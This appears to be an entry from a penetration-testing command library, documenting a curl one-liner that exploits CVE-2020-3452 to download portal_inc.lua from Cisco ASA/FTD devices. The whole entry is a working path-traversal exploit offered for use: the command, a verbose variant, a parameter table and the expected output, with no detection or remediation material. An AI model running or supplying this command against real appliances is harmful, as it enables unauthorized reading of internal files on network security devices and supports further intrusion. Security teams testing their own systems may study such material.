---
id: cmd-curl-portal-inc
data: >-
  curl -k
  "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
  --output portal_inc.lua
tags:
  - path-traversal
  - http-get
  - file-download
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.396Z'
verified: false
validated: true
submitted: true
---
# curl-download-portal-inc-lua

## Command

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

## Description

This command exploits path traversal in Cisco ASA/FTD web services (CVE-2020-3452) to download the internal portal_inc.lua file using curl's HTTP GET capabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode: skips SSL certificate verification | Yes (for self-signed certs) |
| `--output` | Specifies output file name (portal_inc.lua) | Yes |
| URL (full) | Crafted endpoint with traversal in 'lang=../' and textdomain targeting file | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -k -v "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

## Expected Output

HTTP response body saved to 'portal_inc.lua' containing the Lua script's content. Success indicated by HTTP 200 and non-empty file.

## Related

- [[commands/curl-download-session-js]]
- [[procedures/Command-Line-Path-Traversal-Exploitation-with-Curl]]
